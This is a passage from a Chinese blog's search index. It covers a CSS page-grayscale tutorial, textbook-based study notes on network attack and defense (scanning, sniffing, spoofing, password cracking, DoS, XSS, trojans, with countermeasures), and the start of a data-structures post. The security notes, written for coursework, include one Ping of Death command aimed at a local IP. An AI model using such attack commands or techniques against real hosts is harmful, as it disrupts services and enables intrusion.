py_envs/Vm_name/Scripts\n\ndeactivate.bat\n```\n\n## 三、Pycharm直接配置环境\n\n![](https://i.loli.net/2020/04/06/unmKz8C4iXtQy3w.png)\n","tags":["虚拟环境"],"categories":["Python"]},{"title":"CSS filter-网页变灰","url":"/posts/58488.html","content":"\n**[本站](https://jwt1399.top)4月4日全天变灰，向逝去生命致以崇高敬意！**\n\n#### CSS filter\n\n> **`filter`** CSS 属性将模糊或颜色偏移等图形效果应用于元素。滤镜通常用于调整图像，背景和边框的渲染。\n\n[官方Demo](https://developer.mozilla.org/zh-CN/docs/Web/CSS/filter)\n\n![官方Demo](https://i.loli.net/2020/04/04/GUc74mjC96FngzZ.gif)\n\n#### 全站变灰\n\n今天很多网站都变灰了，比如简书、B 站、爱奇艺、CSDN 、百度等等。\n我们选择一个网站，比如 B 站吧，打开浏览器开发者工具。审查一下网页的源代码，我们可以发现在 html 的这个地方多了一个疑似的 `class`，叫做 `gray`（灰色）\n\n![1.gif](https://i.loli.net/2020/04/04/1UrPTsv9ZlkmiAy.gif)\n可以看到，我们只要将下面 CSS 样式，加入到页面指定节点，即可实现网页变灰的效果，我们将其取消，就能发现网站的颜色就能重新还原回来了。\n\n```Css\n\nhtml.gray {\n    -webkit-filter: grayscale(.95);\n}\n```\n\n> grayscale 取值为 0%-100%，也可以用 0-1 取代，0%代表彩色图像，100%代表完全的灰度。\n\n另外看看我自己的站点，我用的也是这个 CSS 样式\n\n![image-20200404183434183.png](https://i.loli.net/2020/04/04/a61jfGbm3rORYhq.png)\n\n因为只是今天哀悼短暂用一哈，所以我直接放到了`<head>`里面，其完整内容为：\n```html\n<!--放到<head></head>之间即可-->\n  <style type=\"text/css\"> \n\thtml{ \n\tfilter: grayscale(100%); /* 标准写法 just for IE6-9 */ \n\t-webkit-filter: grayscale(100%); /* webkit 内核支持程度较好 */\n\t-moz-filter: grayscale(100%); /* 其他内核现在并不支持，为了将来兼容性书写 */\n\t-ms-filter: grayscale(100%); \n\t-o-filter: grayscale(100%); \n\tfilter:progid:DXImageTransform.Microsoft.BasicImage(grayscale=1); \n    filter: url(\"data:image/svg+xml;utf8,<svg xmlns=\\'http://www.w3.org/2000/svg\\'><filter id=\\'grayscale\\'><feColorMatrix type=\\'matrix\\' values=\\'0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0 1 0\\'/></filter></svg>#grayscale\"); /* Firefox 3.5+ */\n\t}\n</style>\n```\n这个实现方法兼容性会更好一些。\n\n或者直接调用别人写好的\n```html\n <link href=\"https://static.isenyu.cn/file/css/MemorialDay.css\"; rel=\"stylesheet\" type=\"text/css\" />\n```\n#### 非全站变灰\n\n我们可以将需要使用filter的元素单独加上\n\n```html\n<html>\n    <body>\n        <div class=\"gray-filter\"></div>\n    </body>\n</html>\n\n<style type=\"text/css\">\n.gray-filter {\n    filter: grayscale(100%);\n    -webkit-filter: grayscale(100%);\n    -moz-filter: grayscale(100%);\n    -ms-filter: grayscale(100%);\n    -o-filter: grayscale(100%);\n\tfilter: url(\"data:image/svg+xml;utf8,<svg xmlns=\\'http://www.w3.org/2000/svg\\'><filter id=\\'grayscale\\'><feColorMatrix type=\\'matrix\\' values=\\'0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0 1 0\\'/></filter></svg>#grayscale\");\n    filter: progid:DXImageTransform.Microsoft.BasicImage(grayscale=1);\n}\n</style>\n```\n\n#### CSS filter 的浏览器兼容\n\nChrome31+，Safari7+，Opera20+，ios Safari6+，Android Browser4.4+，Blackberry 10+均支持了`-webkit-filter `的方式，**但是IE 不支持**\n\n![image-20200404182351477](https://i.loli.net/2020/04/04/ONPC5MhxbSVanZB.png)\n\n用`IE`打开发现网页并没有变灰，IE是不支持`filter属性`的,但是影响并不大啦\n\n![image-20200404182133386](https://i.loli.net/2020/04/04/bFtTHMDI25Ey7Vv.png)\n\n参考：[一段css让全站变灰的代码总结](https://www.jb51.net/css/718943.html)\n参考：[图像灰度(grayscale)实现 各浏览器实现方式](https://www.lisa33xiaoq.net/1270.html)\n参考：[如何用一行代码实现网页变灰效果？](https://mp.weixin.qq.com/s/oMXiStiTEL5PR61I4OqCbQ)","tags":["CSS","filter滤镜"],"categories":["Web"]},{"title":"《网络攻击与防御技术》学习笔记","url":"/posts/23380.html","content":"\n## 前言\n\n由于本校所用教材为：`张玉清主编，清华大学出版社出版的《网络攻击与防御技术》`，因此本文是基于此书进行学习及总结的，本文章着重于理论知识，没有实战应用。\n\n《网络攻击与防御技术》PDF 下载地址：[蓝奏云](https://jwt1399.lanzoui.com/iEPXufgdneb)\n\n## 第一章 网络安全概述\n\n### 1.网络安全基础知识\n\n#### 网络安全的基本需求\n\n可靠性、可用性、保密性、完整性、不可抵赖性、可控性、可审查性、真实性\n\n#### 网络安全内容\n\n**网络安全的主体**是保护网络上的数据和通信的安全\n**数据安全性**是一组程序和功能，用来阻止对数据进行非授权的泄漏、转移、修改和破坏\n**通信安全性**是一些保护措施，要求在电信中采用保密安全性、传输安全性、辐射安全性的措施，并依要求对具备通信安全性的信息采取物理完全性措施\n\n#### 网络安全的特征\n\n保密性、完整性、可用性、可控性\n\n#### 攻击类型\n\n**主动攻击**\n\n主动攻击包括对数据流进行篡改或伪造数据流可分为4类:伪装、重放、消息篡改和拒绝服务。\n\n**被动攻击**\n\n被动攻击采取的方法是对传输中的信息进行窃听和监测，主要目标是获得传输的信息。有两种主要的被动攻击方式:信息收集和流量分析。\n\n**社会工程学**\n\n### 2.网络安全的重要性\n\n- 信息系统自身安全的脆弱性\n\n- 信息系统面临的安全威胁\n\n- 安全管理问题\n\n- 黑客攻击\n\n- 网络犯罪\n- 为什么会感染恶意代码\n\n### 3.网络安全威胁及根源\n\n#### 网络安全基本威胁\n\n> 安全的基本目标是实现信息的机密性、完整性、可用性。对信息系统这三个基本目标的威胁就是基本威胁\n\n- 信息泄露：敏感数据被泄露给未授权实体\n- 完整性破坏：通过未授权的创建、修改、删除和重放\n- 拒绝服务：系统被利用，造成服务能力下降或丧失\n\n1. 受到攻击，攻击者通过对系统进行非法的访问尝试而产生过量的系统负载，从而导致系统的资源对合法用户的服务能力下降或丧失\n\n2. 信息系统或组件在物理上受到破坏而中断服务\n\n- 未授权服务：未授权实体非法访问系统资源或授权用户超越权限访问资源\n\n#### 威胁系统的主要方法\n\n冒充、破坏信息的完整性、破坏系统的可用性\n\n重放、辐射侦测、后门、木马、抵赖\n\n#### 威胁存在的根源\n\n- 内部操作不当\n- 内部管理不严\n- 来自外部的威胁\n- TCP/IP协议族的漏洞\n  - ARP欺骗\n  - SYN FLOOD攻击\n\n### 4.网络攻击过程\n\n#### 入侵系统的常用步骤\n\n![](https://i.loli.net/2020/05/14/YKnzbmkFWg4HyXu.png)\n\n#### 较高明的入侵步骤\n\n![](https://i.loli.net/2020/05/14/Ln7kaQCYID6TNeb.png)\n\n### 5.防护措施\n\n![](https://i.loli.net/2020/05/14/tcQGadoeIqDlPUm.png)\n\n![](https://i.loli.net/2020/05/14/QuoEnlVaUfI6BGD.png)\n\n\n\n## 第三章 扫描与防御\n\n### 扫描的三个阶段\n\n**一个完整的网络安全扫描分为三个阶段:**\n\n- `第一阶段:`发现目标主机或网络\n- `第二阶段:`发现目标后进一步搜集目标信息，包括操作系统类型、运行的服务以及服务软件的版本等。如果目标是一个网络，还可以进一步发现该网络的拓扑结构、路由设备以及各主机的信息\n- `第三阶段:` 根据收集到的信息判断或者进一步测试系统是否存在安全漏洞\n\n### 扫描技术\n\n#### 主机扫描（涉及到的原理）\n\n向目标系统发送ICMP回显请求报文，并等待返回的ICMP回显应答，然后打印出回显报文．收到返回的ICMP报文，就说明主机存活。\n\n目的：找出网段内活跃主机\n\n#### 端口扫描（涉及到的原理）\n\n端口扫描是通过向连接到目标系统的 TCP 端口或 UDP 端口发送消息,记录目标系统的响应,搜集到很多关于目标主机的各种有用的信息。\n\n目的：找出主机上所开放的网络服务\n\n##### 全扫描（TCP Connect）\n\n**优点：**不需要什么特权，所以几乎所有的用户（包括多用户环境下）都可以通过connec()函数来实现这个操作\n\n**缺点：**这种扫描方法会在日志文件中留下大量密集的连接和错误记录，很容易被发现，并过滤掉。\n\n##### 半扫描（TCP SYN扫描）\n\n**优点：**采用这种 “半打开扫描”，目标系统并不对它进行登记， 因此比全扫描扫描更隐蔽。 即使日志中对于扫描有所记录， 对尝试连接的记录也要比全扫描的记录少得多。\n\n**缺点：**但在大部分操作系统中，发送主机需要构造适用于这种扫描类型的IP包， 通常只有超级用户或得到授权的用户才有权限访问专门的系统调用， 构造这种专门的SYN数据包．\n\n##### 秘密扫描（TCP FIN扫描）\n\n**优点：**由于这种技术不包含标准的TCP三次握手协议的任何部分，无法被记录下来， 这样就比SYN扫描要隐蔽得多。\n\n**缺点：**与SYN扫描类似， 秘密扫描也要用户具有特殊权限以构造IP包。 另外， 由于这种技术是利用了某些操作系统实现TCP/IP协议时的漏洞，因此，并不是对所有的操作系统都有效，通常只在基于UNIX的TCP/IP协议栈上可以成功地应用，而在Windows NT 环境下，该方法无效， 因为不论目标端口是否打开操作系统都会发送RST 。 利用这一点\n来区分UNIX和WindowsNT, 也是十分有用的．\n\n#### 远程主机OS指纹识别（涉及到的原理）\n\n识别主机安装的操作系类型，以选择不同渗透攻击代码及配置\n\n#### 漏洞扫描（涉及到的原理）\n\n找出主机/网络服务上所存在的安全漏洞，作为破解通道\n\n### 扫描的防御\n\n#### 反扫描技术的原理\n\n- 是针对扫描技术提出的\n- 扫描技术一般分为主动扫描和被动扫描，共同点在于在其执行的过程中，都需要与受害主机互通正常\n\n#### 主动扫描\n\n- 主动向目标机发送各种探测包，根据其回应判断扫描结果\n- 防范：\n  - 减少开放端口，做好系统防护\n  - 实时监测扫描，及时做出告警\n  - 伪装知名端口，进行信息欺骗\n\n#### 被动扫描\n\n与目标机建立正常连接，发送的数据包也属于正常范畴，被动扫描不会向受害主机发送大规模的探测数据，因此防范方法较难，目前只能采用`信息欺骗`方法\n\n#### 防火墙技术\n\n#### 审计技术\n\n## 第四章 网络嗅探与防御\n\n### 监听的概念\n\n- 又名网络嗅探，是一种在他方未察觉的情况下捕获其通信报文或通信内容的技术\n- 网络监听是一把双刃剑，对于攻防双方都有重要的意义\n- 网络监听技术的能力范围只限于局域网，主机可以接收到本网段在同一条物理通道上传输的所有信息，而不管这些的发送方和接收方是谁\n\n### 监听的技术\n\n- 共享式局域网的监听技术及原理\n\n- 交换式局域网的监听技术及原理\n\n### 监听的防御\n\n- 安全的拓扑结构\n\n- 数据加密（SSL、VPN）\n\n- 共享式网络下的防监听\n  - 网络和主机响应时间测试\n\n  - ARP检测（检测对方是否在混杂模式下）\n\n- 交换式网络下的防监听\n  - 防止ARP欺骗          \n\n## 第五章 口令破解\n\n### 口令的弱点\n\n- 口令过于简单，容易被人猜出来\n- 口令过于复杂，用户往往需要抄下来（不好记忆），这样使得口令反而更不安全\n- 安全性仅依赖于口令\n- 口令可被进行字典式攻击\n\n### 建立口令遵循的规则\n\n1、不使用和用户名相同的口令\n\n2、不使用日期口令\n\n3、不使用英文单词\n\n4、尽量选择长的口令\n\n5、经常更换口令\n\n6、不使用有自己相关信息的口令\n\n### 字典攻击原理\n\n字典攻击使用的是一个包含大多数词典单词的文件，利用这些单词来猜测口令\n\n### 如何对口令进行破解（口令破解工具的原理）\n\n**口令破解方式：**\n\n词典攻击、强行攻击、组合攻击等\n\n**口令破解工具的原理：**\n\n![](https://img.jwt1399.top//img/20200809194307.png)\n\n口令破解器通常由候选口令产生器 、 口令加密模块和口令比较模块组成。 \n\n候选口令产生器用来产生认为可能是口令的单词， 在口令加密模块， 使用知道的加密算法对候选口令加密， 将加密后的候选口令密文与实际口令的密文一起送到口令比较模块进行比较，如果一致， 那么，当前候选口令发生器中送出来的单词就是要寻找的口令，如果不一致， 那么候选口令产生器再生成下一个候选口令。\n\n## 第六章 欺骗攻击\n\n### IP欺骗\n\n#### 什么是IP欺骗？\n\nTCP/IP网络中的每一个数据包都包含源主机和目的主机的IP地址， 攻击者可以使用其他主机的IP地址，井假装自己来自该主机，以获得自己未被授权访问的信息。 这种类型的攻击称为IP欺骗\n![](https://i.loli.net/2020/03/31/CJxP7R1yMiLmZ8E.png)\n\n#### 基本的IP欺骗技术\n\n- 基本地址变化\n- 使用源站选路截取数据包\n- 利用信任关系\n\n#### IP欺骗高级应用—TCP会话劫持\n\n![](https://i.loli.net/2020/03/31/5RJ1XALFi2nIHao.png)\n\n### ARP欺骗\n\n#### 原理\n\n通过虚假请求或响应报文，使得其他主机的ARP列表发生改变而无法正常通信的攻击行为。\n\n#### 如何实施\n\n通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。\n\n#### 防范\n\n1.MAC地址绑定。 使网络中每一台计算机的lP地址与硬件地址一一对应， 不可更改．\n2.使用静态ARP缓存。 手动更新缓存中的记录， 使ARP欺骗无法进行。\n3.使用ARP服务器，通过该服务器查找自己的ARP转换表来响应其他机器的ARP广播。 这里要确保这台ARP服务器不被攻击者控制。\n4.使用ARP欺骗防护软件， 如ARP防火墙。\n5.及时发现正在进行ARP欺骗的主机， 并将其隔离。\n\n### DNS欺骗\n\n![DNS域名解析](https://i.loli.net/2020/04/16/hU8iAmPl72n9GOa.png)\n\n#### 原理\n\n当客户主机向本地DNS服务器查询域名的时候，如果服务器的缓存中已经有相应记录，DNS服务器就不会再向其他服务器进行查询，而是直接将这条记录返回给用户。攻击者正是利用这一点,通过在`DNS服务器的本地Cache`中缓存一条`伪造的解析记录`来实现DNS欺骗的。\n\n#### 实现步骤\n\n![DNS欺骗过程](https://img.jwt1399.top//img/20200802102438.png)\n\n## 第七章 拒绝服务攻击与防御\n\n### 拒绝服务攻击的概念\n\n拒绝服务攻击（DoS，Denial of Service）是指攻击者利用系统的缺陷，通过执行一些恶意的操作，使得`合法的系统用户不能及时得到应得的服务或系统资源`，如CPU处理时间、存储空间以及网络带宽等\n\nDoS最本质的特征是`延长服务等待时间，使用户无法忍受而放弃服务`\n\n### 拒绝服务攻击的基本模式\n\n- 资源消耗型\n  - 消耗网络带宽\n  - 消耗磁盘空间\n  - 消耗CPU和内存资源\n\n- 配置修改型：如破坏系统的配置信息，阻止其他合法用户登录\n\n- 基于系统缺陷型：故意输入错误口令一定次数后导致系统锁定该用户账户\n\n- 物理实体破坏型：对通信路由设备的破坏\n\n### 典型拒绝服务攻击技术\n\n**死亡之Ping（Ping of Death）**\n\nPing之所以会造成伤害源于ICMP协议\n\nICMP协议`报文长度(64KB)`是固定的。早期的很多操作系统在处理ICMP协议数据报文时，只开辟了`64KB的缓存区`用存放接收到的ICMP数据包。 一旦发送过来的ICMP数据包超过64KB, 操作系统将收到的数据报文向缓存区中填写时，就会产生一个缓存溢出，引起内存访问错误，导致TCP/IP协议堆栈崩溃，造成主机的重启动或者死机。\n\n早期的Ping程序有一个\"-l\"参数可指定发送数据包的尺寸， 在使用Ping命令时利用这个参数指定数据包的尺寸大于64KB(65536字节)。 \n\n```bash\nPing -l 65540 192.168.1.140\n```\n\n如果对方主机存在这样一个漏洞，就会因接收的ICMP数据包长度过大导致缓存溢出，形成一次拒绝服务攻击。这种攻击被称为Ping of Death, 又叫 “死亡之Ping\"。\n\n**泪滴（Teardrop）**\n\n**SYN FLOOD**\n\n**Smurf**\n\n**分布式反射拒绝服务攻击**\n\n### 分布式拒绝服务攻击(DDoS)\n\n#### 分布式\n\n “分布 ” 是指把较大的计算量或工作量分成多个小任务，交由连接在一起的多个处理器或多个节点共同协作完成。\n\n#### 分布式拒绝服务攻击\n\n**Distributed Denial of Service** 是攻击者寻找网络上有漏洞的主机，进入系统后在其上面安装后门程序，控制大量的被入侵主机同时对目标发起DoS攻击。 如图7-6所示， 攻击者控制分布在世界各地的众多主机同时攻击某一个受害者。\n\n![](https://i.loli.net/2020/04/16/sScB8JoFk4RYd9P.png)\n\n\n\n## 第九章 Web攻击与防御技术\n\n### WEB服务器指纹识别\n\n通过对服务器上的HTTP应用程序安装和配置等信息进行远程刺探，从而了解远程Web服务器的配置信息，然后根据不同版本的Web服务器进行有目的的攻击。\n\n指纹识别是为了判断服务器的版本,从而找到服务器的漏洞。\n\n### WEB页面盗窃\n\nWeb盗窃的目的是通过对各个网页页面源码的详细分析，找出可能存在于代码、注释或者设计中的关键缺陷和脆弱点，以此来确定攻击的突破点。\n\n盗窃web服务器的两种方法:逐页手工扫描和自动扫描。\n\n**防御**\n\n1. 提高Web页面代码的质量\n2. 监视访问日志中快速增长的GET请求\n3. 在Web站点上设置garbage.cgi脚本\n4. 经常注意网络上新出现的web扫描脚本的攻击内容\n\n### 网页验证码的作用和重要性\n\n1、为了确保用户提交的请求是在线进行的正常操作\n\n2、防止用户使用程序自动进行提交注入\n\n3、防止暴力破解、恶意注水等\n\n4、保证服务器系统的稳定性和用户信息的安全\n\n### SQL注入\n\n。。。\n\n### XSS攻击\n\nXSS是跨站脚本攻击(Cross Site Script)。它指的是恶意攻击者往Web页面里插入恶意JS代码，当用户浏览该网页时，嵌入其中Web里面的htmI代码会被执行，从而达到恶意用户的特殊目的。\n\n## 第十章 木马攻击与防御技术\n\n#### 木马的危害\n\n木马病毒对计算机的直接破坏方式是改写磁盘，对计算机数据库进行破坏，给用户带来不便。当木马破坏程序后，使得程序无法运行，给计算机的整体运行带来严重的影响。另外一些木马可以通过磁盘的引导区进行，病毒具有强烈的复制功能，把用户程序传递给外部链接者。还可以更改磁盘引导区，造成数据形成通道破坏。病毒也通过大量复制抢占系统资源，对系统运行环境进行干扰，影响计算机系统运行速度。\n\n#### 木马攻击的过程\n\n攻击者利用木马进行网络入侵的攻击过程一般为：首先将木马`植入目标系统`； 然后木马程序必须能够`自动加载运行`，并且能够很好地`隐藏自己`；最后木马必须可以实现一些攻击者感兴趣的功能，例如`远程控制`。\n\n- 植入技术\n- 自加载技术\n- 隐藏技术\n- 远程控制\n\n#### 防御\n\n**木马检测：**\n\n1. 端口扫描和连接检查\n\n2. 检查系统进程\n3. 检查ini 文件、 注册表和服务\n4. 监视网络通信\n\n**木马防范：**\n\n1. 及时修补漏洞， 安装补丁\n2. 运行实时监控程序\n3. 培养风险惹识\n4. 即时发现， 即时清除\n\n## 总复习\n\n### 1.Web页面盗窃\n\n#### 原理\n\nWeb盗窃的目的是通过对各个网页页面源码的详细分析，找出可能存在的代码、注释或者设计中的关键缺陷和脆弱点，以此来确定攻击的突破点。\n\n盗窃web服务器的两种方法:逐页手工扫描和自动扫描。\n\n#### **防御**\n\n1. 提高Web页面代码的质量\n2. 监视访问日志中快速增长的GET请求\n3. 在Web站点上设置garbage.cgi脚本\n4. 经常注意网络上新出现的web扫描脚本的攻击内容\n\n### 2.特洛伊木马\n\n#### 木马的危害\n\n自动搜索已中木马的计算机\n管理对方资源，如查看文件内容、上传文件等\n跟踪监视对方屏幕和运行的任务\n远程监测和操纵计算机\n\n#### 木马攻击的过程\n\n攻击者利用木马进行网络入侵的攻击过程一般为：首先将木马`植入目标系统`；然后木马程序必须能够`自动加载运行`，并且能够很好地`隐藏自己`；最后木马必须可以实现一些攻击者感兴趣的功能，例如`远程控制`。\n\n涉及技术：植入技术、自加载技术、隐藏技术、远程控制技术\n\n#### 木马的特点\n\n有效性、隐蔽性、顽固性、易植入性\n\n#### 防御\n\n**木马检测：**\n\n1. 端口扫描和连接检查\n\n2. 检查系统进程\n3. 检查 ini 文件、 注册表和服务\n4. 监视网络通信\n\n**木马防范：**\n\n1. 及时修补漏洞， 安装补丁\n2. 运行实时监控程序\n3. 培养风险意识\n4. 即时发现， 即时清除\n\n### 3.服务可用性\n\n  计算机软件系统处于可工作的时间比例，就是服务的可用性\n\n### 4.字典攻击\n\n字典攻击使用的是一个包含大多数词典单词的文件，利用这些单词来猜测口令\n\n### 5.网络嗅探\n\n- 是一种在他方未察觉的情况下捕获其通信报文或通信内容的技术\n- 网络嗅探技术的能力范围只限于局域网，主机可以接收到本网段在同一条物理通道上传输的所有信息，而不管这些的发送方和接收方是谁\n\n**嗅探的技术**\n\n- 共享式局域网的监听技术\n\n- 交换式局域网的监听技术\n\n**嗅探的防御**\n\n- 安全的拓扑结构\n\n- 会话加密\n\n\n**共享式网络下的防监听**\n\n- 网络和主机响应时间测试\n\n- ARP检测（检测对方是否在混杂模式下）\n\n**交换式网络下的防监听**\n\n- 防止ARP欺骗         \n\n### 6.访问控制\n\n访问控制是网络安全防范和保护的主要资源，它的主要任务是保证网络资源不被非法使用和非法访问。\n\n### 7.DoS攻击\n\n拒绝服务攻击（DoS，Denial of Service）是指攻击者利用系统的缺陷，通过执行一些恶意的操作，使得`合法的系统用户不能及时得到应得的服务或系统资源`，如CPU处理时间、存储空间以及网络带宽等\n\nDoS最本质的特征是`延长服务等待时间，使用户无法忍受而放弃服务`\n\n### 8. 被动攻击\n\n攻击者对传输中的信息进行窃听和监测，获得传输的信息。\n\n被动攻击方式：信息收集和流量分析。\n\n### 9. 主动攻击\n\n攻击者访问他所需信息的故意行为，一般会改变系统资源或影响系统运作。\n\n主动攻击方式：包括对数据流进行篡改或伪造数据流，可分为四类：伪装、重放、消息篡改和拒绝服务。\n\n### 10. OS指纹识别\n\n通过对不同操作系统的TCP/IP协议存在的细微差异，识别主机安装的操作系类型，以选择不同渗透攻击代码及配置\n\n分为：主动协议栈指纹识别、被动协议栈指纹识别\n\n### 11. IP欺骗\n\n**什么是IP欺骗？**\n\nTCP/IP网络中的每一个数据包都包含源主机和目的主机的IP地址， 攻击者可以使用其他主机的IP地址，井假装自己来自该主机，以获得自己未被授权访问的信息。 这种类型的攻击称为IP欺骗\n![](https://i.loli.net/2020/03/31/CJxP7R1yMiLmZ8E.png)\n\n**基本的IP欺骗技术**\n\n- 基本地址变化\n- 使用源站选路截取数据包\n- 利用信任关系\n\n**IP欺骗高级应用—TCP会话劫持**\n\n![](https://i.loli.net/2020/03/31/5RJ1XALFi2nIHao.png)\n\n### 12. 弱口令\n\n- 口令过于简单，容易被人猜出来\n- 口令过于复杂，不好记忆，这样使得口令反而更不安全\n- 安全性仅依赖于口令\n- 口令可被进行字典式攻击\n\n### 13. XSS攻击\n\nXSS是跨站脚本攻击(Cross Site Script)。它指的是恶意攻击者往Web页面里插入恶意JS代码，当用户浏览该网页时，嵌入其中Web里面的JS代码会被执行，从而达到恶意用户的特殊目的。\n\n### 14. Web服务器指纹识别\n\n通过对服务器上的HTTP应用程序安装和配置等信息进行远程刺探，从而了解远程Web服务器的配置信息，然后根据不同版本的Web服务器进行有目的的攻击。\n\n指纹识别是为了判断服务器的版本,从而找到服务器的漏洞。\n\n### 15.网络信息安全四要素\n\n保密性、完整性、可用性、可控性\n\n### 16.ARP欺骗攻击的原理与防范\n\n#### 原理\n\n通过虚假请求或响应报文，使得其他主机的ARP列表发生改变而无法正常通信的攻击行为。\n\n#### 防范\n\n1.MAC地址绑定。 使网络中每一台计算机的lP地址与硬件地址一一对应， 不可更改．\n2.使用静态ARP缓存。 手动更新缓存中的记录， 使ARP欺骗无法进行。\n3.使用ARP服务器，通过该服务器查找自己的ARP转换表来响应其他机器的ARP广播。 这里要确保这台ARP服务器不被攻击者控制。\n4.使用ARP欺骗防护软件， 如ARP防火墙。\n5.及时发现正在进行ARP欺骗的主机， 并将其隔离。\n\n### 17.建立口令遵循的规则\n\n1、不使用和用户名相同的口令\n2、不使用日期口令\n3、不使用英文单词\n4、尽量选择长的口令\n5、经常更换口令\n6、不使用有自己相关信息的口令\n\n### 18.端口扫描的原理与目的\n\n端口扫描是通过向连接到目标系统的 TCP 端口或 UDP 端口发送消息,记录目标系统的响应,搜集到很多关于目标主机的各种有用的信息。\n\n目的：找出主机上所开放的网络服务\n\n### 19.SYN Flood\n\n**原理**\n\nSYN Flood是当前最流行的DoS(拒绝服务攻击)与DDoS(分布式拒绝服务攻击)的方式之一，它是利用TCP三次握手的缺陷，发送大量伪造的TCP连接请求，从而使得被攻击方资源耗尽(CPU满负荷或内存不足)的攻击方式\n\n**目的**\n\n导致系统或服务器宕机。\n\n### 20.DDoS的工作方式\n\n**Distributed Denial of Service** 是攻击者寻找网络上有漏洞的主机，进入系统后在其上面安装后门程序，控制大量的被入侵主机同时对目标发起DoS攻击。\n\n### 21.共享式网络和交换式网络\n\n**共享式网络监听的方法**\n\n既可以用软件的方式实现，也可以用硬件设备的形式实现\n\n- 由于集线器会广播所有数据，网卡在混杂模式下，所有流经网卡的数据帧都会被网卡驱动程序上传给网络层\n\n- 通过混杂模式嗅探到的数据包上传到网络层后，网络层处理程序还要对其目的IP进行判断，如果不是本地IP，丢弃\n\n- 所以，如果没有一个特定的机制，上层应用也无法抓到不属于自己的数据包         \n\n**共享式网络监听的原理**\n\n- 如果网卡设置成混杂模式，那么在这个局域网内传输的任何信息都可以被该网络接口接收到，主机的这种状态就是监听模式\n- 处于监听模式下的主机可以监听到同一个网段下的其他主机发送的数据包\n\n**交换式网络监听的方法**\n\n通过对交换机、主机、网关等进行欺骗可以实现对网络的监听。如溢出攻击、采用ARP欺骗、MAC欺骗\n\n**交换式网络监听的原理**\n\n每块网卡都对应唯一的硬件MAC地址, 它有两种工作模式:普通模式和混杂模式。在普通模式下, 网卡只能接收发送给自己的数据包, 其它经过的数据包都自动丢弃;在混杂模杂下, 网卡则会接收在同一网段上传输的所有数据包。因为监听只会发生在共享式网络中, 在交换式网络中, 这种简单地将网卡设置为混杂模式是不能监听整个网络的, 因为交换机是工作在数据链路层, 每个端口对应不同的MAC地址, 当有数据到达交换机时, 会从特定的端口转发数据包。\n\n### 22.口令破解软件的工作原理\n\n![](https://img.jwt1399.top//img/20200809194307.png)\n\n口令破解器通常由候选口令产生器 、 口令加密模块和口令比较模块组成。 \n\n候选口令产生器用来产生认为可能是口令的单词， 在口令加密模块， 使用知道的加密算法对候选口令加密， 将加密后的候选口令密文与实际口令的密文一起送到口令比较模块进行比较，如果一致， 那么，当前候选口令发生器中送出来的单词就是要寻找的口令，如果不一致， 那么候选口令产生器再生成下一个候选口令。\n\n### 23.网页验证码的作用及重要性。\n\n1、防止用户使用程序自动进行提交注入\n\n2、防止暴力破解、恶意注水等\n\n3、保证服务器系统的稳定性\n\n### 24.端口扫描\n\n目的：找出主机上所开放的网络服务\n\n##### 全扫描（TCP Connect）\n\n**优点：**不需要什么特权，所以几乎所有的用户（包括多用户环境下）都可以通过connec()函数来实现这个操作\n\n**缺点：**这种扫描方法会在日志文件中留下大量密集的连接和错误记录，很容易被发现，并过滤掉。\n\n##### 半扫描（TCP SYN扫描）\n\n**优点：**采用这种 “半打开扫描”，目标系统并不对它进行登记， 因此比全扫描扫描更隐蔽。 即使日志中对于扫描有所记录， 对尝试连接的记录也要比全扫描的记录少得多。\n\n**缺点：**但在大部分操作系统中，发送主机需要构造适用于这种扫描类型的IP包， 通常只有超级用户或得到授权的用户才有权限访问专门的系统调用， 构造这种专门的SYN数据包．\n\n##### 秘密扫描（TCP FIN扫描）\n\n**优点：**由于这种技术不包含标准的TCP三次握手协议的任何部分，无法被记录下来， 这样就比SYN扫描要隐蔽得多。\n\n**缺点：**与SYN扫描类似， 秘密扫描也要用户具有特殊权限以构造IP包。 另外， 由于这种技术是利用了某些操作系统实现TCP/IP协议时的漏洞，因此，并不是对所有的操作系统都有效，通常只在基于UNIX的TCP/IP协议栈上可以成功地应用，而在Windows NT 环境下，该方法无效。\n\n### 25.网络安全\n\n**实现的基本目标**\n\n网络安全的基本目标是实现信息的完整性、机密性、可用性、合法性\n\n**网络存在安全威胁的原因**\n\n- 内部操作不当\n- 内部管理不严\n- 来自外部的威胁\n- TCP/IP协议族的漏洞\n  - ARP欺骗\n  - SYN FLOOD攻击\n\n### 26.黑客入侵的过程\n\n**入侵系统的常用步骤**\n\n![](https://i.loli.net/2020/05/14/YKnzbmkFWg4HyXu.png)\n\n **较高明的入侵步骤**\n\n![](https://i.loli.net/2020/05/14/Ln7kaQCYID6TNeb.png)\n\n  \n\n## **赞助💰**\n\n**如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭**\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["网络攻防"],"categories":["Course"]},{"title":"数据结构与算法","url":"/posts/40445.html","content":"\n# 一、数据结构\n\n线性结构：数组、队列、链表、栈\n\n- 顺序存储（地址连续）\n- 链式存储（地址不一定连续）\n\n非线性结构：二维数组、多维数组、广义表、树、图\n\n## ①数组\n\n### ❶稀疏数组\n\n稀疏数组是一种用来压缩数据量的数据结构，简而言之，就是记录特殊值，然后剩下大量重复的数据可以消减。\n\n例如下方是一个普通二维数组\n\n```\n0 0 0 0 0 0\n0 0 1 0 0 0\n0 0 0 2 0 0\n0 0 0 0 0 0\n0 0 0 0 0 0\n0 0 0 0 0 0\n```\n\n这么一个二维数组，化成稀疏数组可以表示为：\n\n```properties\n   行 列 值\n0  6  6  2\n1  1  2  1\n2  2  3  2\n\n1. 稀疏数组第一行表示原数组有多少行，多少列，有多少个非零元素（有效值）\n2. 稀疏数组是从0开始的\n3. 稀疏数组的行数等于有效值+1，列数固定都为3\n```\n\n二维数组转稀疏数组的步骤：\n\n- 